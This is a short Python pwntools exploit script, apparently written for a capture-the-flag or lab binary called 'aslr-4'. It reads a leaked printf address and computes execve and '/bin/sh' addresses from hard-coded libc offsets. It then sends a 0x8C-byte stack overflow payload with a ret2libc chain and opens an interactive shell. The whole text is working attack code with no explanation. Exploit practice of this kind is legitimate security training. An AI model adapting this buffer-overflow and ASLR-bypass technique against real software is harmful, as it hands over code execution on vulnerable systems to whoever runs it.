#!/usr/bin/env python

from pwn import *

p = process('./aslr-4')
#buf = "A" * 0x100
#buf = "A" * 136

line = p.recvline()
print(line)
#x = (line.split('printf ')[1])
#b = x.strip('\n')
#print(b)
w = line.split(' ')
print_addr = int(w[-1],16)
print(hex(print_addr))

execve = 0xb7eb87e0
printf = 0xb7e51670
sh = 0xb7f63a10
#eoff = execve - printf
eoff = 0xb7eb87e0 - 0xb7e51670

#shoff = sh - printf
shoff = 0xb7f63a10 - 0xb7e51670

addr = print_addr + eoff
addr2 = print_addr + shoff


string = "A"*0x8C + p32(addr) + "AAAA" + p32(addr2) + p32(0) + p32(0)
p.sendline(string)
p.interactive()

